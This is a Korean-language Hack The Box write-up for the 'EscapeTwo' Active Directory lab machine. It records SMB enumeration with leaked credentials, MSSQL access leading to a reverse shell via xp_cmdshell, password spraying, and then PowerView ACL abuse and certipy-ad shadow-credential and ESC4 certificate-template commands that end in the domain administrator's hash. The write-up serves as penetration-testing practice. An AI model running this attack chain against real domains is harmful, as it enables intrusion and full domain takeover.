---
layout: post
title: Hack The Box - EscapeTwo
subtitle: Hack the box [Season 7] EscapeTwo machine
category: writeup
thumbnail-img: /assets/img/writeup/HTB/escapetwo/pwned.png
tags:
  [
    writeup,
    hackthebox,
    escapetwo,
    windows,
    powerview,
    bloodhound,
    certipy-ad,
    esc4,
    mssql,
  ]
author: Hong
---

# User flag

## nmap

```sh
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-03-31 10:22:25Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-03-31T10:24:32+00:00; +1h17m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-03-31T10:24:32+00:00; +1h17m00s from scanner time.
1433/tcp open  ms-sql-s          Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.10.11.51:1433:
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.51:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-03-31T10:20:49
|_Not valid after:  2055-03-31T10:20:49
|_ssl-date: 2025-03-31T10:24:32+00:00; +1h17m04s from scanner time.
3268/tcp open  ldap
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-03-31T10:24:32+00:00; +1h17m00s from scanner time.
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-03-31T10:24:32+00:00; +1h17m00s from scanner time.
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

눈에 띄는 프로토콜은 smb, ldap, mssql이 있다.

ldap이 잔뜩 나오는 걸 보니 AD 관련 머신인 듯 하다.

도메인 정보도 알 수 있다. sequel.htb

이번 머신은 시작 전에 크레덴셜을 하나 주어진다. rose / KxEPkKe6R8su

위의 크레덴셜을 이용해서 smb를 살펴본다.

## smb

가볍게 유저들 정보를 파악해보자.

```sh
nxc smb 10.10.11.51 -u rose -p KxEPkKe6R8su --users
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SMB         10.10.11.51     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.51     445    DC01             Administrator                 2024-06-08 16:32:20 0       Built-in account for administering the computer/domain
SMB         10.10.11.51     445    DC01             Guest                         2024-12-25 14:44:53 0       Built-in account for guest access to the computer/domain
SMB         10.10.11.51     445    DC01             krbtgt                        2024-06-08 16:40:23 0       Key Distribution Center Service Account
SMB         10.10.11.51     445    DC01             michael                       2024-06-08 16:47:37 0
SMB         10.10.11.51     445    DC01             ryan                          2024-06-08 16:55:45 0
SMB         10.10.11.51     445    DC01             oscar                         2024-06-08 16:56:36 0
SMB         10.10.11.51     445    DC01             sql_svc                       2024-06-09 07:58:42 0
SMB         10.10.11.51     445    DC01             rose                          2024-12-25 14:44:54 0
SMB         10.10.11.51     445    DC01             ca_svc                        2025-04-01 14:32:29 0
SMB         10.10.11.51     445    DC01             [*] Enumerated 9 local users: SEQUEL
```

그리고 smbmap도 해본다.

```sh
smbmap -u rose -p KxEPkKe6R8su -H 10.10.11.51

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.11.51:445 Name: sequel.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Accounting Department                                   READ ONLY
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        Users                                                   READ ONLY
```

디폴트 파일들을 제외하면 Users와 Accounting Department에 읽기 권한이 있다.

Accounting Department안에 파일이 두개 있는데 엑셀 형식이지만 파일 정보를 보면 zip 파일이라고 나온다.

압축을 푼 다음 파일 내용을 확인해보면 크레덴셜을 발견할 수 있다.

```sh
grep -i pass -r .
grep: ./Default/NTUSER.DAT: binary file matches
./xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
```

이중에 mssql의 크레덴셜이 눈에 띈다. 이걸 사용해서 데이터베이스에 접속해보자.

## mssql

리눅스에서 mssql에 접속하기 위해 `impacket-mssqlclient`가 있지만 이번에는 `mssqlpwner`라는 툴을 사용해봤다.

-db <db명>으로 접속할 데이터베이스를 정할 수 있다. 디폴트로 master에 들어가진다.

```sh
mssqlpwner sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51 interactive
[*] Connecting to 10.10.11.51:1433 as sa
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
State file already exists, do you want to use it? (y/n): y
[*] Enumeration completed successfully
[*] Saving state to file
[*] Chosen linked server: DC01
MSSqlPwner#DC01 (sa@master/dbo)>
```

exec 명령어를 사용해서 xp_cmdshell을 이용할 수 있다.

데이터베이스에 파일들이 매우 많은데 딱히 도움이 될 정보는 없었다. (파일들 하나하나 확인하는데 굉장한 시간을 소요했다.)

리버스쉘 페이로드를 이용해서 리버스쉘을 얻기로 결정.

![리버스쉘](/assets/img/writeup/HTB/escapetwo/mssql.png)

리버스쉘로 접속 후 파일들을 살펴보다보면 또 다른 크레덴셜을 발견한다.

![ryan](/assets/img/writeup/HTB/escapetwo/ryan.png)

**위에서 찾은 유저 정보들과 새롭게 찾은 비밀번호를 전부 리스트로 만들어서 스프레이 공격을 해본다.**

그러면 ryan으로 로그인에 성공한다.

유저 플래그는 ryan의 데스크톱에 있다.

# root flag

이 머신은 권한 상승이 굉장히 어려웠다.

처음보는 패턴의 취약점이었기 때문이다.

머신 안에서 파일의 권한이나 unquoted 등의 문제를 발견할 수 없었고 winpeas를 돌려도 딱히 공격할 벡터를 발견할 수 없었다.

그래서 powerview로 유저의 권한에 특이점이 있나 살펴봤다.

## powerview

(이번에 처음으로 kali에서 원격으로 [powerview](https://github.com/aniqfakhrul/powerview.py)를 조작할 수 있다는 걸 알았다.)

![powershell](/assets/img/writeup/HTB/escapetwo/powershell.png)

로그인하면 인터액티브한 화면으로 연결된다. 이 세션에서 powerview의 명령어들을 이용할 수 있다.

커맨드도 더 알기 쉽고 빠르고 tab키를 누르면 명령어도 자동완성되서 굉장히 편하다.

ryan으로 정보를 수집해야 하기 때문에 우선 ryan의 objectsid를 쿼리한다.

![sid](/assets/img/writeup/HTB/escapetwo/ryansid.png)

ryan의 sid를 이용해서 접근권한을 확인한다.

![acl](/assets/img/writeup/HTB/escapetwo/objectacl.png)

결과를 보면 CA 오브젝트에 대해서 writeowner 권한이 있는 것을 확인 할 수 있다.

write권한이 있으면 관리자 권한까지 획득 가능한 취약점이 있다고 한다.

[CA (Cerification Authority)](https://learn.microsoft.com/ko-kr/windows-server/identity/ad-cs/active-directory-certificate-services-overview)는 액티브 디렉토리의 Certification Service에서 유저, 컴퓨터, 서비스를 대상으로 인증서를 발급하고 유효기간을 관리한다고 한다.

Certification Service (CS)는 인증서를 관리하는 windows의 서비스다.

우선 CA의 오너를 ryan으로 바꾼다.

![objowner](/assets/img/writeup/HTB/escapetwo/objowner.png)

현재 owner가 ryan으로 바뀌었다는 메세지가 나온다.

그 다음 ryan의 쓰기 권한을 이용해서 ca_svc에 모든 컨트롤 권한을 부여한다.

![addacl](/assets/img/writeup/HTB/escapetwo/addacl.png)

## certipy-ad

그다음 certipy-ad라는 툴을 이용하여 인증서를 만든다.

Active Directory 환경에서 공격자가 인증을 우회하거나 권한 상승을 시도할 수 있는 **Shadow Credentials**를 자동으로 탐지하고 추출하는 명령어를 입력한다.

![shadow](/assets/img/writeup/HTB/escapetwo/shadow.png)

그럼 ca_sva 어카운트의 증명서가 생성된다. 이 때 발급되는 해쉬값을 이용해서 새로운 취약점을 공략할 수 있다.

다음 명령어로 취약한 템플릿을 찾는다.

`sudo certipy-ad find -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable -dc-ip 10.10.11.51`

![temp1](/assets/img/writeup/HTB/escapetwo/temp1.png)

![temp2](/assets/img/writeup/HTB/escapetwo/temp2.png)

그럼 DunderMifflinAuthentication이라는 템플릿이 조회가 되고 ESC4 취약점이 있다고 나온다.

```sh
sudo certipy-ad template -username 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

아래의 명령어로 administrator의 인증서를 조작할 수 있다.

![req](/assets/img/writeup/HTB/escapetwo/req.png)

그다음 관리자의 해쉬값을 추출한다.

![admin](/assets/img/writeup/HTB/escapetwo/admin.png)

추출된 해쉬값을 이용하여 어드민으로 로그인 할 수 있다.

![rootshell](/assets/img/writeup/HTB/escapetwo/rootshell.png)

# 느낀점

우선 처음보는 유형의 문제라서 어려웠다.

powerview를 제대로 쓸 줄 알아야한다는 점.

certipy-ad를 쓸 줄 알아야된다는 점.

esc4 취약점이 무엇인지 알아야한다는 점.

escapeone도 비슷한 유형이라고 하니 풀어봐야겠다.

# 참고자료

https://redfoxsec.com/blog/exploiting-weak-acls-on-active-directory-certificate-templates-esc4/
